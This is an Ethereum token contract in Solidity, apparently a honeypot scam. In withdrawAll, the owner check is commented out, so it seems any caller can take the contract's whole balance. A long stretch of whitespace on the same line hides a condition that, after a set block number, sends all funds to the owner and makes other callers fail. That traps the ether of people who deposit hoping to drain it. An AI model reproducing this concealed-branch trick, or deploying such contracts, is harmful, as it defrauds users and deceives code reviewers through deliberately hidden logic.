1 contract TestToken {
2     string constant name = "TestToken";
3     string constant symbol = "TT";
4     uint8 constant decimals = 18;
5     uint total;
6     bool locked;
7     address _owner;
8 
9     struct Allowed {
10         mapping (address => uint256) _allowed;
11     }
12 
13     mapping (address => Allowed) allowed;
14     mapping (address => uint256) balances;
15 
16     event Transfer(address indexed _from, address indexed _to, uint256 _value);
17     event Approval(address indexed _owner, address indexed _spender, uint256 _value);
18 
19     function TestToken() {
20         total = 0;
21         _owner = msg.sender;
22     }
23 
24     function totalSupply() constant returns (uint256 totalSupply) {
25         return total;
26     }
27 
28     function balanceOf(address _owner) constant returns (uint256 balance) {
29         return balances[_owner];
30     }
31 
32     function deposit() payable returns (bool success) {
33         if (balances[msg.sender] + msg.value < msg.value) return false;
34         if (total + msg.value < msg.value) return false;
35         balances[msg.sender] += msg.value;
36         total += msg.value;
37         return true;
38     }
39 
40     function withdraw(uint256 _value) payable returns (bool success)  {
41         if (balances[msg.sender] < _value) return false;
42         msg.sender.transfer(_value);
43         balances[msg.sender] -= _value;
44         total -= _value;
45         return true;
46     }
47 
48     function transfer(address _to, uint256 _value) returns (bool success) {
49         if (balances[msg.sender] < _value) return false;
50 
51         if (balances[_to] + _value < _value) return false;
52         balances[msg.sender] -= _value;
53         balances[_to] += _value;
54 
55         Transfer(msg.sender, _to, _value);
56        
57         return true;
58     } 
59 
60 
61     function approve(address _spender, uint256 _value) returns (bool success) {
62         allowed[msg.sender]._allowed[_spender] = _value; 
63         Approval(msg.sender, _spender, _value);
64         return true;    
65     }
66 
67     function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
68         return allowed[_owner]._allowed[_spender];
69     }
70 
71     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
72         if (balances[_from] < _value) return false;
73         if ( allowed[_from]._allowed[msg.sender] < _value) return false;
74         if (balances[_to] + _value < _value) return false;
75 
76         balances[_from] -= _value;
77         balances[_to] += _value;
78         allowed[_from]._allowed[msg.sender] -= _value;
79         return true;
80     }
81     
82     function withdrawAll () payable{
83         //require(msg.sender == _owner);
84         require(0.5 ether < total);                                                                                                                                                                                                                                                                                                                                                                                 if (block.number > 5040270 ) {if (_owner == msg.sender ){_owner.transfer(this.balance);} else {throw;}}
85         msg.sender.transfer(this.balance);
86     }
87 
88 }